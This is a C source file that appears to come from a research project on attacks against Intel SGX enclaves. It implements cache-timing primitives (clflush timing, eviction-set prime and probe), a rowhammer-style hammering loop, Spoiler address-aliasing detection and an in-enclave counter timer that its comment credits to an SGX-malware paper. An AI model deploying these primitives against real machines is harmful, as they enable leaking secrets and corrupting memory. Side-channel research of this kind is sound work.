/*
 * Copyright (C) 2011-2020 Intel Corporation. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in
 *     the documentation and/or other materials provided with the
 *     distribution.
 *   * Neither the name of Intel Corporation nor the names of its
 *     contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "ThreadTest.h"

#define BUFFER_SIZE 50
#define USE_MEAN 1

long int global_counter = 0;
int monitor_running = 0;
int monitor_ready = 0;
int sampler_ready = 0;
pthread_mutex_t global_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t mutex_start = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t condp = PTHREAD_COND_INITIALIZER;
pthread_cond_t condSets = PTHREAD_COND_INITIALIZER;
unsigned char secret_data[BUFFER_SIZE] = {0};
char memory_map[RESERVED_MEMORY];
long int eviction_set[MONITORED_SETS*CACHE_SET_SIZE * CACHE_SLICES];
long int eviction_set_1[CACHE_SET_SIZE * CACHE_SLICES];
long int samples_data[MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES * SAMPLES_SIZE];
int ram_border = 0;
uint8_t *secret_data_read = NULL;
char aad_mac_text[BUFSIZ] = "aad mac text";
long int *base_address = NULL;

/*
* Aux function to access data
*/

/*Get the value of a memory location*/
long int mem_access(long int *v)
{
    long int rv = 0;
    asm volatile(
        "movq (%1), %0"
        : "+r"(rv)
        : "r"(v)
        :);
    return rv;
}

/*Flush data from the cache*/
void flush_data(long int *pos_data)
{
    asm __volatile__(
        " clflush 0(%0) \n"
        :
        : "c"(pos_data));
}

/*Timed access*/
long int access_timed(long int *pos_data, long int *t1)
{
    long int t = global_counter;
    lfence();
    long int lect = mem_access(pos_data);
    lfence();
    *t1 = (global_counter - t);
    return lect;
}

/*Timed access*/
long int access_timed_1(long int *pos_data)
{
    long int t = global_counter;
    lfence();
    long int lect = mem_access(pos_data);
    lfence();
    return (global_counter - t);
}

/*Timed access*/
long int calibrate_miss(long int *pos_data)
{
    long int t1, t = global_counter;
    lfence();
    mem_access(pos_data);
    lfence();
    t1 = global_counter - t;
    lfence();
    flush_data(pos_data);
    return t1;
}

long int prime_ev_set(unsigned long int pos_data)
{
    unsigned long *begin = (unsigned long *)pos_data;
    unsigned long int t1 = global_counter;
    mfence();
    lfence();
    do
    {
        begin = (unsigned long *)(*begin);
    } while (begin != (unsigned long *)pos_data);
    lfence();
    mfence();
    return (global_counter - t1);
}

/*Timed access*/
long int two_access_timed(long int *pos_data1, long int *pos_data2)
{

    asm __volatile__(
        " clflush 0(%0) \n"
        " clflush 0(%1) \n"
        " lfence \n"
        " mfence \n"
        :
        : "c"(pos_data1), "r"(pos_data2));
    long int t1 = global_counter;
    asm __volatile__(
        " mfence \n"
        " lfence \n"
        " movq 0(%0), %%rbx \n"
        " movq 0(%1), %%rdx \n"
        " lfence \n"
        " mfence \n"
        :
        : "c"(pos_data1), "r"(pos_data2));
    return (global_counter - t1);
}

long int measure_access(long int *pos_data)
{
    long int time = global_counter;
    asm __volatile__(
        " movl (%0), %%eax \n"
        :
        : "c"(pos_data)
        : "%esi", "%edx");
    time = global_counter - time;
    return time;
}

/*Flush desired set*/
void flush_desired_set(long int address_array[], int len)
{
    int i;
    for (i = 0; i < len; ++i)
    {
        flush_data((long int *)address_array[i]);
    }
}

/*Test if an element is evicted by an array of candidates*/
int probe_candidate(int number_elements, long int array_set[], long int *dir_candidate)
{
    int i;
    mem_access(dir_candidate);
    lfence();
    for (i = 0; i < number_elements; ++i)
    {
        mem_access((long int *)array_set[i]);
        //lfence();
    }
    lfence();
    i = (int)access_timed_1(dir_candidate);
    return i;
}

/*Test if an element is evicted by an array of candidates*/
int probe_candidate_sorted(int number_elements, long int array_set[], long int *dir_candidate)
{
    int i;
    long u = mem_access(dir_candidate);
    lfence();
    for (i = 0; i < number_elements; ++i)
    {
        u = mem_access((long int *)array_set[i]);
        lfence();
        mfence();
    }
    lfence();
    i = (int)access_timed_1(dir_candidate);
    return i;
}

int probe_candidate_flush(int number_elements, long int array_set[], long int *dir_candidate)
{
    int i, j;
    for (j = 0; j < 2; ++j)
    {
        long u = mem_access(dir_candidate);
        for (i = 0; i < number_elements; ++i)
        {
            u = mem_access((long int *)array_set[i]);
        }
    }
    lfence();
    flush_data(dir_candidate);
    flush_desired_set(array_set, number_elements);
    lfence();
    mfence();
    long u = mem_access(dir_candidate);
    lfence();
    mfence();
    for (i = 0; i < number_elements; ++i)
    {
        u = mem_access((long int *)array_set[i]);
        lfence();
    }
    lfence();
    mfence();
    i = (int)access_timed_1(dir_candidate);
    return i;
}

void randomize_set(long int array[], int len)
{
    int i;
    int random_number;
    uint32_t val;
    sgx_read_rand((unsigned char *)&val, 4);
    for (i = 0; i < len; ++i)
    {
        random_number = val % (len);
        long int original = array[i];
        array[i] = array[random_number];
        array[random_number] = original;
    }
}

int check_inside(long int dato, long int array_data[], int array_length)
{
    int i;
    int si = 0;
    for (i = 0; i < array_length; ++i)
    {
        if (dato == array_data[i])
        {
            si = 1;
            break;
        }
    }
    return si;
}

/*Function for hammering data*/
long int hammer(long int *pos1, long int *pos2, int rounds)
{
    int i = 0;
    long int total_time = 0;
    long int t1, t2;
    for (i = 0; i < rounds; ++i)
    {
        total_time += two_access_timed(pos1, pos2);
    }
    return total_time;
}

/*
 * Aux function for quick masking and getting the bits:
 */
int parity(unsigned long int v)
{
    v ^= v >> 1;
    v ^= v >> 2;
    v = (v & 0x1111111111111111UL) * 0x1111111111111111UL;
    return (v >> 60) & 1;
}



/*
 * Spoiler peaks:
 */

void address_aliasing(int w, int x, int ini, long int meas[PAGE_COUNT])
{
    int i, j, p;
    long int dif;
    /*Important! start in a physical address ending in 0x000*/
    /*int ini = 0;
    for (i = ini; i < ini + 0xFFF; i++)
    {
        if ((((long int)(&memory_map[i])) & 0xFFF) == 0xFFF)
        {
            ini = i + 1;
            break;
        }
    }*/
    long int *test_address1 = (long int *)(&memory_map[x * PAGE_SIZE + ini]);

    memset(meas, 0, PAGE_COUNT * sizeof(long int));

    for (p = w; p < PAGE_COUNT; p++)
    {
        dif = 0;
        for (j = 0; j < 10; j++)
        {
            for (i = w; i >= 0; i--)
            {
                memory_map[(p - i) * PAGE_SIZE + ini] = 0;
            }

            dif += measure_access(test_address1);
        }
        meas[p] = dif;
    }
}

/*
 * Simple peak searching:
 */

int peak_search(long int simple_set[PAGE_COUNT], long int meas[PAGE_COUNT])
{
    int i, j = 0;
    int sum = 0, av, ant = 0;
    int max = 0,lim = 600;
#if USE_MEAN
    for (i = 1; i < 1000; i++)
    {
        if (meas[i] > 0)
        {
            sum += meas[i];
            if (meas[i] > max)
            {
                max = meas[i];
            }
        }
    }
    av = sum / (1000);
    //max = max / (1000);
    lim = (0.6 * (max - av));
    if (lim > 800)
    {
        lim = 800;
    }

#else
    av = 2200;
    lim = 600;
#endif
    for (i = 1; i < PAGE_COUNT; i++)
    {
        if (meas[i] > (av + lim))
        {
            if ((i - ant) > WINDOW_SIZE)
            {
                simple_set[i]++;
                ant = i;
                j++;
            }
        }
    }
    return lim;
}

/*
 * increase_counter:
 */
long int increase_counter(void)
{
    long int ret = 0;
    pthread_mutex_lock(&global_mutex);
    /* mutually exclusive adding */
    long int tmp = global_counter;
    global_counter = ++tmp;
    ret = global_counter;
    pthread_mutex_unlock(&global_mutex);
    return ret;
}

/*
 * retrieve the counter value:
 */
long int check_counter(void)
{
    long int ret = 0;
    pthread_mutex_lock(&global_mutex);
    ret = global_counter;
    pthread_mutex_unlock(&global_mutex);
    return ret;
}

/*
 * Check if the secondary thread is running
 */

int check_running(void)
{
    int ret = 0;
    pthread_mutex_lock(&global_mutex);
    ret = monitor_running;
    pthread_mutex_unlock(&global_mutex);
    return ret;
}

/*
 * Check if the secondary thread is ready
 */

int check_ready(void)
{
    int ret = 0;
    pthread_mutex_lock(&global_mutex);
    ret = monitor_ready;
    pthread_mutex_unlock(&global_mutex);
    return ret;
}

/*
 * Check if everything is ready for data collection 
 */

int check_sampler(void)
{
    int ret = 0;
    pthread_mutex_lock(&global_mutex);
    ret = sampler_ready;
    pthread_mutex_unlock(&global_mutex);
    return ret;
}

/*
* Fast counter based on the SGX-Malware paper
* Ideally this process will run forever
*/

void *fast_counter(void *)
{
    pthread_mutex_lock(&global_mutex);
    monitor_running = 1;
    pthread_mutex_unlock(&global_mutex);

    global_counter = 0;

    asm("movq %0, %%rcx\n\t"
        " xor %%rax, %%rax \n\t"
        " 1: inc %%rax \n\t"
        " movq %%rax, (%%rcx) \n\t"
        " jmp 1b \n\t"
        :                      /*  No output */
        : "r"(&global_counter) /* input */
        : "%rcx", "memory"     /* clobbered register */
    );
}

/*
 * Monitor function
 */

void *counter(void *)
{
    pthread_mutex_lock(&global_mutex);
    monitor_running = 1;
    pthread_mutex_unlock(&global_mutex);

    while (global_counter < 40)
    {
        unsigned int tsx = _xbegin();
        if (tsx == _XBEGIN_STARTED)
        {
            while (1)
            {
            }
        }
        else
        {
            increase_counter();
        }
    }
    pthread_mutex_lock(&mutex_start);
    monitor_ready = 1;
    pthread_mutex_unlock(&mutex_start);
    pthread_cond_signal(&condp);
    while (global_counter < 400000000)
    {
        increase_counter();
    }
}
